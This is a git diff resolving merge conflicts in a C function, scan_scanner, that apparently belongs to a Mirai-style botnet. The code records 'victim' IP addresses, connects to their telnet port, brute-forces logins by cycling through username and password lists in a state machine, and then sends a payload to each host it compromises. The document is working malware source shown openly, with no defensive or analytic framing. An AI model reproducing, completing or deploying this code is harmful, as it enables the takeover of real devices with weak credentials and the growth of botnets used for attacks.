@@ -320,13 +320,13 @@ bool scan_scanner(void)
 					printd("Adding IP: %s/%s", ipstr, ipv4_unpack(riph->saddr))
 }
 #endif
-<<<<<<< HEAD
 					struct scan_victim *victim;
 					victim = &victim_table[i];
 					victim->ip = riph->saddr;
 					victim->user = 0;
 					victim->pass = 0;
-					victim->state = READY;
+					victim->tries = 0;
+					victim->state = CONNECTING;
 					if (i++ >= SCAN_SCANNER_MAXCON)
 						break;
 				}
@@ -334,30 +334,10 @@ bool scan_scanner(void)
 		}
 		while (1)
 		{
-			while (victim_table[i])
 			struct sockaddr_in addrx;
 			addrx.sin_family = AF_INET;
 			addrx.sin_port = htons(23);
 			memset(addrx.sin_zero, '\0', sizeof(addrx.sin_zero));
-=======
-				struct scan_victim *victim;
-				victim = &victim_table[i];
-				victim->ip = riph->saddr;
-				victim->user = 0;
-				victim->pass = 0;
-				victim->tries = 0;
-				if (i++ >= SCAN_SCANNER_MAXCON)
-					break;
-			}
-		}
-	}
-	while (1)
-	{
-		struct sockaddr_in addrx;
-		addrx.sin_family = AF_INET;
-		addrx.sin_port = htons(23);
-		memset(addrx.sin_zero, '\0', sizeof(addrx.sin_zero));
->>>>>>> origin/master
 
 			struct timeval timeout;
 			timeout.tv_sec = SCAN_SCANNER_SEC;
@@ -390,110 +370,41 @@ bool scan_scanner(void)
 					} 
 					case USERNAME:
 					{
-<<<<<<< HEAD
-						/*
-						Need to make this readuntil accept more than one string
-=======
-						victim_table[i].state = FINISHED;
-					}
-					else
-					{
-						victim_table[i].state = USERNAME;
-					}
-					break;
-				} 
-				case USERNAME:
-				{
-					uint8_t ret = scan_readuntil(victim_table[i].sock, userprompts, prompts);
+						uint8_t x = scan_readuntil(victim_table[i].sock, userprompts, prompts);
 
-					switch (ret)
-					{
-						case 0:
-							victim_table[i].state = FINISHED;
-							break;
-						case 1:
-							break;
-						case 2:
-							victim_table[i].state = PAYLOAD;
-					}
->>>>>>> origin/master
-
-						so I can do const userwords[] {
-							"login",
-							"user"
+						switch (x)
+						{
+							case 0:
+								victim_table[i].state = FINISHED;
+								break;
+							case 1:
+								break;
+							case 2:
+								victim_table[i].state = PAYLOAD;
 						}
-						then go readuntil(sock, userwords)
-						*/
-						if (scan_readuntil(victim_table[i].sock, userprompts) == false)
-							victim_table[i].state = FINISHED;
-
-<<<<<<< HEAD
 						if (send(victim_table[i].sock, usernames[victim_table[i].user], strlen(usernames[victim_table[i].user]), 0) == -1)
 						{
 							victim_table[i].state = FINISHED;
 							break;
 						}
-
-						if (scan_readuntil(victim_table[i].sock, failstrs) == true)
+						x = scan_readuntil(victim_table[i].sock, failstrs, passprompts);
+						switch (x)
 						{
-							if (victim_table[i].user++ >= usersize)
-=======
-					uint8_t ret = scan_readuntil(victim_table[i].sock, failstrs, passprompts);
-					switch (ret)
-					{
-						case 0:
-							victim_table[i].state = FINISHED;
-							break;
-						case 1:
-							if (victim_table[i].user++ >= usersize)
+							case 0:
 								victim_table[i].state = FINISHED;
-							break;
-						case 2:
-							victim_table[i].state = PASSWORD;
-							break;
-					}
-					break;
-				}
-				case PASSWORD:
-				{
-
-					if (send(victim_table[i].sock, passwords[victim_table[i].pass], strlen(passwords[victim_table[i].pass]), 0) == -1)
-					{
-						victim_table[i].state = FINISHED;
-						break;
-					}
-
-					uint8_t ret = scan_readuntil(victim_table[i].sock, failstrs, prompts);
-					switch (ret)
-					{
-						case 0:
-							victim_table[i].state = FINISHED;
-							break;
-						case 1:
-							if (victim_table[i].pass++ >= passsize)
->>>>>>> origin/master
-							{
-								victim_table[i].pass = 0;
+								break;
+							case 1:
 								if (victim_table[i].user++ >= usersize)
 									victim_table[i].state = FINISHED;
-								else
-									victim_table[i].state = USERNAME;
-							}
-<<<<<<< HEAD
+								break;
+							case 2:
+								victim_table[i].state = PASSWORD;
+								break;
 						}
-						else
-							victim_table[i].state = PASSWORD;
-	/*
-		HEY! This won't work because we will read the password prompt when we try to read for failstrs 
-		this means the next scan_readuntil will 100% fail! 
-		YAYYYYY
-	*/
 						break;
 					}
 					case PASSWORD:
 					{
-						if (scan_readuntil(victim_table[i].sock, passprompts) == false)
-							victim_table[i].state = FINISHED;
 
 						if (send(victim_table[i].sock, passwords[victim_table[i].pass], strlen(passwords[victim_table[i].pass]), 0) == -1)
 						{
@@ -501,26 +412,31 @@ bool scan_scanner(void)
 							break;
 						}
 
-						if (scan_readuntil(victim_table[i].sock, failstrs) == true)
-							if (victim_table[i].pass++ >= passsize)
-							{
-								victim_table[i].pass = 0;
-								if (victim_table[i].user++ >= usersize)
-								{
-									victim_table[i].state = FINISHED;
-									break;
-								}
-								victim_table[i].state = USERNAME;
-							}
-							else
+						uint8_t x = scan_readuntil(victim_table[i].sock, failstrs, prompts);
+						switch (x)
+						{
+							case 0:
+								victim_table[i].state = FINISHED;
 								break;
-						else
-							victim_table[i].state = PAYLOAD;
+							case 1:
+								if (victim_table[i].pass++ >= passsize)
+								{
+									victim_table[i].pass = 0;
+									if (victim_table[i].user++ >= usersize)
+										victim_table[i].state = FINISHED;
+									else
+										victim_table[i].state = USERNAME;
+								}
+							case 2:
+								victim_table[i].state = PAYLOAD;
+						}
 						break;
 					}
 					case PAYLOAD:
 					{
-						send(victim_table[i].sock, SCAN_SCANNER_PAYLOAD, strlen(SCAN_SCANNER_PAYLOAD), 0);
+						// I know this look stupid for now but I'll clean it up later
+						if (send(victim_table[i].sock, SCAN_SCANNER_PAYLOAD, strlen(SCAN_SCANNER_PAYLOAD), 0) == -1)
+							victim_table[i].state = FINISHED;
 						victim_table[i].state = FINISHED;
 						break;
 					}
@@ -528,25 +444,6 @@ bool scan_scanner(void)
 					{
 						break;
 					}
-=======
-							break;
-						case 2:
-							victim_table[i].state = PAYLOAD;
-					}
-					break;
-				}
-				case PAYLOAD:
-				{
-					// I know this look stupid for now but I'll clean it up later
-					if (send(victim_table[i].sock, SCAN_SCANNER_PAYLOAD, strlen(SCAN_SCANNER_PAYLOAD), 0) == -1)
-						victim_table[i].state = FINISHED;
-					victim_table[i].state = FINISHED;
-					break;
-				}
-				case FINISHED:
-				{
-					break;
->>>>>>> origin/master
 				}
 			}
 		}
